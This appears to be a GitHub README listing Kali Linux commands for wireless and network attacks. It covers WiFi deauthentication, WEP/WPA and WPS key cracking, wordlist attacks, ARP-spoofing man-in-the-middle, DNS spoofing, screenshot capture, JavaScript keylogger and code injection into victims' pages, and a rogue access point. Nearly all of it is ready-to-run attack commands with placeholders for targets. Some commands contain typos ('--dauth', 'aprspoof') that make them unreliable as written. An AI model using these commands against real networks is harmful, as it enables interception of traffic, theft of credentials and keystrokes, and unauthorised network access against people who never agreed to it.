# Useful Hacking and Penetration Testing Commands

Useful commands in Kali Linux for penetration testing and ethical hacking

## Basic Linux commands: Device information

View information about your own device. IP addresses, adapters connected, etc... 

```bash
ifconfig 
```
View information about wireless interfaces in your device

```bash
iwconfig
```
To change wireless adapter into monitor mode. Monitor mode allows us to sniff packets through the network

```bash
iwconfig wlan0 mode monitor
```
## Other commands
1. zip a file: `tar czvf <filename>`
2. unzip file: `tar xzvf <filename>`
3. network info: `netstat`
4. last user logged in the system: `last`
5. who is logged in: `who` or `w`: 
6. network downloader: `wget <url-link>`
7. change permission: `chmod`
8. send file to a remote computer: `scp /path/to/file username@remoteIP:~/path/to/file`
9. From remote server to local computer: `scp username@remoteIP:~/path/to/file /path/to/file` 



## Preconnection Attack: Airodump-ng

Discover wireless networks within range:
```bash
airodump-ng wlan0
```

To sniff packets in the selected network: 

```bash
airodump-ng --bssid _____ --channel _ --write _test_ wlan0 
```
bssid: mac address of target network
channel: channel of the network
write: if you want to store the packets in a file
wlan0: wireless adapter name

The test file will be available with the .cap file. 
View the .cap file in ```wireshark test.cap```

## Deauthentication Attack

Disconnect any client form any network

```bash
aireplay-ng --dauth <NumOfPackets> -a <NetworkMacaddress> -c <TargetClientMacAddress> -e <WifiNname> <iterface-wlan0>
```
## WEP Cracking

1. Capture a large number of packets with airodump-ng
```bash
airodump-ng --bssid _____ --channel _ --write _test_ wlan0 
```
2. Analyse the captured packets and crack the key with aircrack-ng
```bash
aircrack-ng .capfile
```
3. output: KEY IS FOUND
4. Remove the colons from the key and use it as password

## Fake Authentication Attack

```bash
aireplay-ng --fakeauth 0 -a <TargetMacAddress> -h <WirelessAdapterMacAddress> <interface>
```
**NOTE: Type "ifconfig" to view wireless adapter mac address (unspec ---> first 12 digits)**

This attack injects packets in the network.

## WPA/WPA2
If WPS is Enable:
1. Displays networks with WPS enabled
```bash 
wash --interface wlan0
```
2. 
```bash
aireplay-ng --fakeauth <30> -a <TargetMacAddress> --interface <wlan0>
```
3. Run Reaver in another terminal window
```bash
reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <wlan0> -vvv --no-associate
```
**NOTE: if bug error, then download older version of reaver and run ./reaver _______ **

4. Results: WPS PIN and WPA PSK

If WPS is disable:
1. Capture Handshake between devices
```bash
airodump-ng --bssid <TargetMacAddress> --channel <Channel> --write <handshake> <wlan0>
```
- Wait for the handshake
- wait for a new client or disconnect a client with a fake auth attack. 
- WPA handshake stored in the file 

- Create a wordlist
```bash 
crunch [min][max][characters] -T[pattern] -o [FileName]
```
Example:
```bash
crunch 6 8 abc12 -o test.txt
```
2. Wordlist attack 
```bash
aircrack-ng <handshake.cap> -w <text.txt>
```

## Man In The Middle Attack (MITM)

1. Scan the network IP with `zenmap` 
Example: 192.168.1.1/24

2. To map IP addresses in the network and mac addresses `arp -a`
3. `arpspoof -i <interface> -t <clientIP> <gatewayIP>`
4. In another window. Tell the router I am the victim: `aprspoof -i <interface> -t <gatewayIP> <clientIP>`
5. In another window. Allow Linx be the router and forward packets: `echo 1 > /proc/sys/net/ipv4/ip_forward`

## Man in the Middle Framework (MITMf)

Download the tool `apt-get install mitmf`

```bash 
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface>
```
Use wireshark to sniff packets

## DNS Spoofing with MITMf
1. Start the web server: `service apache2 start` (var/www/html)
2. Configure the A records and add the domain you want to change into your IP address (*.___.com = <MyIPAddress>): 
`leafpad /etc/mitmf/mitmf.conf`
3. `mitmf --arp --spoof --gateway <routerIP> --target <targetIP> -i <interface> --dns`

## Capturing Screen of Target with MITMf
Takes screenshots of the target machine 
They are stored into ghe log directory `var/log/mitmf/
(--screenshotter)
```bash 
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --screen --interval <seconds>
```

## JS Keylogger with MITMf
Injects javascript key logger into a client's webpage
```bash
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --jskeylogger
```

## MITMf code injection
```bash
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --inject --js-payload <"javascriptcode">
```
```bash
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --inject --js-file </path/to/jsfile>
```

**NOTE: if working in real network:**
- Disconnect from virtual network --> Devices --> network --> uncheck (offline) 

## Creating Fake Access Point 
1. Download tool `apt-get intall manatoolkit`
2. `start-nat-simple.sh`
3. Edit the settings: `leafpad /etc/mana-toolkit/hostapd-mana.conf`
- Change interface = wlan0
- ssid = name of the fake network
4. Edit: `leafpad /usr/share/mana-toolkit/run-mana/start-nat/simple.sh`
- upstream = eth0
- phy = wlan0
5. start fake AP: `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
6. Test it with phone or other machine, NOT host machine. 

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)